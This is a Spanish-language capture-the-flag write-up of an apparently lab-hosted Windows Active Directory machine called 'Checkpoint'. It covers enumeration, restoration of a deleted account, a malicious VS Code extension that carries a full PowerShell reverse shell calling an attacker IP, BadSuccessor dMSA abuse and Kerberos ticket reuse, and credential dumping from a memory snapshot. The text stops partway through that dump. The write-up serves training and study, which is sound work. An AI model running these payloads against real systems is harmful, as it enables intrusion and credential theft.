---
title: Checkpoint
icon: material/microsoft-windows
machine:
  os: Windows
  difficulty: Medium
  date: 15/06/2026
  creds: "alex.turner / Checkpoint2024!"
---

# Checkpoint

![](Pasted%20image%2020260616221851.png)

---

## 1. Enumeración

### NMAP

```bash
# Nmap 7.99 scan initiated Mon Jun 15 14:42:08 2026 as: nmap -sCV -p- --min-rate=5000 -oN nmap.txt 10.129.18.138
Nmap scan report for 10.129.18.138
Host is up (0.046s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-15 21:42:59Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc             Microsoft Windows RPC
49706/tcp open  msrpc             Microsoft Windows RPC
49716/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-15T21:43:49
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 15 14:44:29 2026 -- 1 IP address (1 host up) scanned in 141.07 seconds
```

La primera enumeración con nmap vemos varios puertos que marca gran probabilidad de un equipo Active Directory, como es el puerto 139/445 de SMB para ver ficheros, puertos de LDAP, kerberos, DNS...

Iremos poco a poco, vemos como LDAP nos ha dado el nombre del dominio (checkpoint.htb), asi que lo agregaremos a nuestro fichero /etc/hosts

```bash
checkpoint tail -1 /etc/hosts
10.129.18.138	checkpoint.htb
```

Como disponemos de credenciales iniciales, enumeraremos un par de puertos para buscar posibles vectores de entrada e información interesante sobre el objetivo.

He decidido primero ver en SMB, primero comprobando si con las credenciales nos permite iniciar sesión:

```bash
checkpoint nxc smb 10.129.18.138 -u alex.turner -p Checkpoint2024!
SMB         10.129.18.138   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.18.138   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
```

Como marca la herramienta Netexec, nos respondió un "[+]", por lo que nos deja, asi que enumeraremos carpetas compartidas:

```bash
checkpoint nxc smb 10.129.18.138 -u alex.turner -p Checkpoint2024! --shares
SMB         10.129.18.138   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.18.138   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.18.138   445    DC01             [*] Enumerated shares
SMB         10.129.18.138   445    DC01             Share           Permissions     Remark
SMB         10.129.18.138   445    DC01             -----           -----------     ------
SMB         10.129.18.138   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.18.138   445    DC01             C$                              Default share
SMB         10.129.18.138   445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.18.138   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.18.138   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.18.138   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.18.138   445    DC01             VMBackups                       
```

Lo mas destacable aqui es la carpeta "VMBackups" y "DevDrop", aunque nuestro usuario actual solo nos deja leer en la segunda carpeta.

Entrando como el usuario por smbclient, nos damos cuenta de que la carpeta en realidad estaba vacía, por lo que no nos vale como punto de entrada:

```bash
checkpoint smbclient //10.129.18.138/DevDrop -U alex.turner
Cant load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\alex.turner]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue May 26 21:45:01 2026
  ..                                  D        0  Sat May  9 14:42:27 2026
```


Decidi enumerar LDAP, primero con netexec comprobando que valen las mismas credenciales:

```bash
checkpoint netexec ldap 10.129.20.164 -u 'alex.turner' -p 'Checkpoint2024!'                                                                                                    
LDAP        10.129.20.164   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.20.164   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

Como las credenciales funcionan he probado a dumpear todos los usuarios para ver si había alguno interesante:

```bash
nxc ldap 10.129.20.164 -u 'alex.turner' -p 'Checkpoint2024!' --users
LDAP        10.129.20.164   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.20.164   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.20.164   389    DC01             [*] Enumerated 17 domain users: checkpoint.htb
LDAP        10.129.20.164   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.20.164   389    DC01             Administrator                 2026-05-09 16:16:34 0        Built-in account for administering the computer/domain      
LDAP        10.129.20.164   389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.20.164   389    DC01             krbtgt                        2026-05-09 08:41:01 0        Key Distribution Center Service Account                     
LDAP        10.129.20.164   389    DC01             alex.turner                   2026-05-09 09:00:08 0                                                                    
LDAP        10.129.20.164   389    DC01             ryan.brooks                   2026-05-10 13:46:18 0                                                                    
LDAP        10.129.20.164   389    DC01             svc_deploy                    2026-05-09 09:01:19 0        Deployment service account                                  
LDAP        10.129.20.164   389    DC01             james.harper                  2026-05-09 09:02:53 0                                                                    
LDAP        10.129.20.164   389    DC01             sarah.mitchell                2026-05-09 09:02:58 0                                                                    
LDAP        10.129.20.164   389    DC01             emily.carter                  2026-05-09 09:03:05 0                                                                    
LDAP        10.129.20.164   389    DC01             david.reynolds                2026-05-09 09:03:11 0                                                                    
LDAP        10.129.20.164   389    DC01             jessica.coleman               2026-05-09 09:03:15 0                                                                    
LDAP        10.129.20.164   389    DC01             lauren.flores                 2026-05-09 09:03:21 0                                                                    
LDAP        10.129.20.164   389    DC01             michael.torres                2026-05-09 09:03:28 0                                                                    
LDAP        10.129.20.164   389    DC01             kevin.patterson               2026-05-09 09:03:33 0                                                                    
LDAP        10.129.20.164   389    DC01             brian.jenkins                 2026-05-09 09:03:37 0                                                                    
LDAP        10.129.20.164   389    DC01             megan.perry                   2026-05-09 09:03:42 0                                                                    
LDAP        10.129.20.164   389    DC01             max.palmer                    2026-05-26 01:25:15 0   
```


Vemos a bastantes usuarios diferentes, por lo que guardaré estos usuarios en una lista y probaré password spraying (no funcionó).

Podemos hacer una lista con el siguiente comando:

```bash
checkpoint awk 'NR > 1 {print $5}' users.txt | sort -u > lista.txt
➜  checkpoint cat lista.txt 
Administrator
alex.turner
brian.jenkins
david.reynolds
emily.carter
Guest
james.harper
jessica.coleman
kevin.patterson
krbtgt
lauren.flores
max.palmer
megan.perry
michael.torres
ryan.brooks
sarah.mitchell
svc_deploy
➜  checkpoint 
```

Como la enumeración básica no nos está dando buenos resultados, voy a ver los permisos de escritura de nuestro actual usuario.

```bash
bloodyAD git:(main) python3 bloodyAD.py -H 10.129.20.164 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

Vemos una linea muy interesante, donde nuestro usuario tiene el permiso **CREATE_CHILD** en la OU de empleados. 

Me fijé en algo muy interesante, y es que en un CN nos pone "Mark Davies", pero si revisamos nuestra lista de usuarios vemos que no está ese usuario, lo que llego a la conclusión de que fue un usuario eliminado. Aprovechando los permisos que tenemos, podemos probar a restaurar este usuario:

```bash
bloodyAD git:(main) python3 bloodyAD.py -H 10.129.20.164 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

Vemos que hemos recuperado exitosamente el usuario, pero no tenemos su contraseña. Probaremos a hacer lo que hicimos con los otros usuarios y haremos un password spraying:

```bash
bloodyAD git:(main) nxc smb 10.129.20.164 -u mark.davies -p Checkpoint2024!            
SMB         10.129.20.164   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.20.164   445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
```

Vemos que esta vez sí que ha funcionado.

Ahora que tenemos un usuario nuevo enumeraré de nuevo SMB para ver si tenemos acceso a directorios nuevos:

```bash
bloodyAD git:(main) nxc smb 10.129.20.164 -u mark.davies -p Checkpoint2024! --shares
SMB         10.129.20.164   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.20.164   445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.20.164   445    DC01             [*] Enumerated shares
SMB         10.129.20.164   445    DC01             Share           Permissions     Remark
SMB         10.129.20.164   445    DC01             -----           -----------     ------
SMB         10.129.20.164   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.20.164   445    DC01             C$                              Default share
SMB         10.129.20.164   445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.20.164   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.20.164   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.20.164   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.20.164   445    DC01             VMBackups       
```

Vemos algo muy interesante, justo en la carpeta vacía que estuvimos en el principio (DevDrop) tenemos permisos esta vez de lectura y escritura, con un comentario a lado comentando lo siguiente:
```text
VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
```

Sabiendo que las extensiones de VSCode son básicamente archivos ZIP que contiene JavaScript ejecutado por Node.js, si subimos una extensión maliciosa, el servidor la procesará automáticamente y ejecutará nuestro código con privilegios del usuario que corre el servicio.

### Explotación de extensión maliciosa en VSCode

Las extensiones de VSCode necesitan una estructura básica que incluye un archivo de configuración package.json y el script principal en JS que define que pasa cuando se active.

Crearemos una estructura básica e inyectaremos un rev shell en powershell ofuscado en Base64:

```bash
extension cat package.json 
{
  "name": "extension-mala",
  "displayName": "Dinero Gratis",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
```

El asterisco en activationEvents indica que VSCode debe activar la extensión inmediatamente en cuando se abra el programa.

Ahora generaremos el **extension.js** que contendrá el base64 de nuestra revshell (recomiendo usar la página https://www.revshells.com/)

```bash
extension cat extension.js 
const cp = require('child_process');
exports.activate = function() { 
    cp.exec('powershell -WindowStyle Hidden -e [TU_BASE64] 
}
exports.deactivate = function() {}
```

Ahora que tenemos todo definido, para hacer que VSCode reconozca la extensión como un instalador válido es crear el manifest de tipos de contenidos:

```bash
extension cat \[Content_Types\].xml 
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="json" ContentType="application/json"/>
  <Default Extension="js" ContentType="application/javascript"/>
</Types>
```

AVISO: debe llamarse como lo nombré yo, sino no funcionará.

Finalmente empaquetaremos todo usando zip, pero guardandolo con extensión **.vsix**

```bash
zip -r vulnerado.vsix \[Content_Types\].xml extension/
  adding: [Content_Types].xml (deflated 36%)
  adding: extension/ (stored 0%)
  adding: extension/extension.js (deflated 50%)
  adding: extension/package.json (deflated 29%) 
```

Con todo preparado, solo faltará poner nuestro listener (nc -lvnp 4444) y pasar el archivo por smb a la carpeta y simplemente esperar a que inicien la extensión:

```bash
smbclient //10.129.20.164/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' -c 'put vulnerado.vsix'      
Can't load /etc/samba/smb.conf - run testparm to debug it
putting file vulnerado.vsix as \vulnerado.vsix (2,4 kB/s) (average 2,4 kB/s)
```

Atentos a nuestro netcat:

```bash
extension nc -lvnp 4444    
Listening on 0.0.0.0 4444
Connection received on 10.129.20.164 54400
whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code> 
```

(NOTA: si no funcionó recomiendo usar el siguiente extension.js):

```bash
checkpoint  cat extension/extension.js 
const cp = require('child_process');
exports.activate = function() { 
    cp.exec('powershell -WindowStyle Hidden -c "$c = New-Object System.Net.Sockets.TCPClient(\'<tu_ip>\',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sbt = $sb + \'PS \' + (pwd).Path + \'> \';$sby = ([text.encoding]::ASCII).GetBytes($sbt);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"'); 
}
exports.deactivate = function() {}
```

Vemos que estamos como ryan.brooks, este usuario tenía la user flag:

```bash
PS C:\Program Files\Microsoft VS Code> cd ~
PS C:\Users\ryan.brooks> cd Desktop
PS C:\Users\ryan.brooks\Desktop> dir


    Directory: C:\Users\ryan.brooks\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-ar---         6/16/2026   3:07 PM             34 user.txt                                                             


PS C:\Users\ryan.brooks\Desktop> 
```

## 2. ROOT

### Enumeración

Buscando información sobre este usuario me fijé en esto:

```powershell
PS C:\Users\ryan.brooks> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes                                        
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
CHECKPOINT\VPN-Users                       Group            S-1-5-21-3129162710-3498938529-1807524340-1109 Mandatory group, Enabled by default, Enabled group
CHECKPOINT\DevTeam                         Group            S-1-5-21-3129162710-3498938529-1807524340-1110 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                      
PS C:\Users\ryan.brooks> 
```

Nos fijamos en 2 grupos bastante destacables, tanto VPN-Users como DevTeam.

Obtenemos más información sobre el grupo por BloodyAD:

```bash
 python3 bloodyAD.py -H 10.129.20.164 -d checkpoint.htb -u mark.davies -p 'Checkpoint2024!' get children
 <cortado>
 distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

distinguishedName: OU=IT,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: OU=Finance,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: OU=HR,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: OU=Engineering,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=IT-Staff,OU=IT,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Finance-Staff,OU=Finance,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=HR-Staff,OU=HR,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Engineering-Staff,OU=Engineering,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=VPN-Users,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=DevTeam,OU=Engineering,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=James Harper,OU=IT,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Sarah Mitchell,OU=IT,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Emily Carter,OU=Finance,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=David Reynolds,OU=Finance,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Jessica Coleman,OU=HR,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Lauren Flores,OU=HR,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Michael Torres,OU=Engineering,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Kevin Patterson,OU=Engineering,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Brian Jenkins,OU=Engineering,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=Megan Perry,OU=Engineering,OU=Employees,DC=checkpoint,DC=htb

distinguishedName: CN=DnsAdmins,CN=Users,DC=checkpoint,DC=htb

distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=checkpoint,DC=htb

distinguishedName: CN=BCKUPKEY_05769298-60fe-4a13-a6b2-b58a966ce6fe Secret,CN=System,DC=checkpoint,DC=htb

distinguishedName: CN=BCKUPKEY_P Secret,CN=System,DC=checkpoint,DC=htb

distinguishedName: CN=BCKUPKEY_6eba49dd-cdf6-44e6-be52-f541f74eb4c1 Secret,CN=System,DC=checkpoint,DC=htb

distinguishedName: CN=BCKUPKEY_PREFERRED Secret,CN=System,DC=checkpoint,DC=htb

distinguishedName: CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb
```

Al revisar el output, nos llama mucho la atención la existencia de una Unidad Organizativa extraña llamada **OU=DMSAHolder**. Sabiendo que estamos en el grupo DevTeam y que este grupo tiene permisos para crear objetos dentro de esa OU, podemos abusar de la delegación de cuentas dMSA mediante la técnica conocida como **BadSuccessor**.

### Ejecución de BadSuccessor

Como no tenemos la contraseña del usuario ejecutamos rubeus desde powershell:

```powershell
PS C:\Windows\Temp> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: QfpJyQAdv6IjrLjv7YsCr04TsqJqyQrRAo9gn1KLqUI=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgE<base64>
```

Copiamos todo el base64 y lo metemos en un fichero de nuestro equipo, luego lo convertiremos a base64 y exportaremos el ticket en la caché.

```bash
checkpoint nvim ticket.txt      
(venv) ➜  checkpoint cat ticket.txt | base64 -d > ryan.kirbi
(venv) ➜  checkpoint ticketConverter.py ryan.kirbi ryan.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
(venv) ➜  checkpoint export KRB5CCNAME=/home/deivid/ctf/checkpoint/ryan.ccache 
```

Lanzamos el exploit nativo de bloodyAD para registrar la dMSA falsa y forzar la suplantación de la cuenta **svc_deploy**.

```bash
checkpoint python3 bloodyAD/bloodyAD.py -H DC01.checkpoint.htb --dc-ip 10.129.20.164 -d checkpoint.htb -u ryan.brooks -k add badSuccessor fsociety -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
[+] Creating DMSA fsociety$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : fsociety$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-17 02:50:37+00:00
EndTime      : 2026-06-17 12:47:03+00:00
RenewTill    : 2026-06-24 02:47:03+00:00
Flags        : forwardable, enc-pa-rep, pre-authent, renewable, forwarded
Keytype      : 18
Key          : RBxj9sL7K+5CMvmkWwbYsl0LFHrICjozJF6hLbl4CzE=
EncodedKirbi : 

    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
    Qg==
[+] dMSA TGT stored in ccache file fsociety_xP.ccache

dMSA current keys found in TGS:
AES256: 827a220f35b117e3e83ac663c324298c9533b3bc63438cb3540e68ca49037154
AES128: 186c726bb90add9b8401a4408669076f
RC4: 489ae2d1abac321663a30f1981d8eb50

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
(venv) ➜  checkpoint 
```

El ataque funcionó perfecto y nos genera en nuestra carpeta un ticket Kerberos llamado "fsociety_xP.ccache", además de darnos su clave AES256.

Para entrar al servidor usando el nuevo ticket, primero limpiaremos la variable con un unset, para que no choque, y cargamos nuestro ticket para conectarnos por Kerberos:

```bash
unset KRB5CCNAME
export KRB5CCNAME=$(pwd)/fsociety_xP.ccache
evil-winrm -i DC01.checkpoint.htb -r CHECKPOINT.HTB -u 'svc_deploy' -K fsociety_xP.ccache
```

Conseguimos acceder al usuario que deseamos:

```powershell
*Evil-WinRM* PS C:\Users\fsociety$\Documents> whoami
checkpoint\fsociety$
```

### Extracción de credenciales del Backup

Dado que nuestro usuario pertenece al grupo de gestión de respaldos, lo primero sería buscar ficheros de copias de seguridad:

```powershell
C:\Users\fsociety$\Documents> Get-ChildItem -Path C:\ -Recurse -Include "*.vmem","*.vhdx","*.bak" -ErrorAction SilentlyContinue


    Directory: C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/9/2026   7:40 PM     2147483648 Windows Server 2019-Snapshot1.vmem
```

Nos encontramos un snapshot de 2GB. Los ficheros .vmem son volcados en caliente de la memoria RAM, significando que contiene una copia exacta de los secretos del sistema operativo, incluyendo los hashes LSA.

Primero, subiré un binario llamado vmkatz.exe desde evil-winrm:

```bash
upload /home/deivid/ctf/checkpoint/vmkatz.exe C:\vmkatz.exe
```

Una vez tengamos el fichero, ejecutaremos:

```powershell
*Evil-WinRM* PS C:\Users\fsociety$> .\vmkatz.exe "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem"
vmkatz.exe : [*] vmkatz v1.4.5-beta.1
    + CategoryInfo          : NotSpecified: ([*] vmkatz v1.4.5-beta.1:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError


[*] System discovery: 15.2367561s[*] Process enumeration: 49.2436ms[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
[*] Credential extraction: 147.4808ms
[+] 2 logon session(s), 2 with credentials:

  LUID: 0x3e4 (NETWORK SERVICE)
  Username: WIN-0DG6SJAEUTA$
  Domain: WORKGROUP
  [DPAPI]
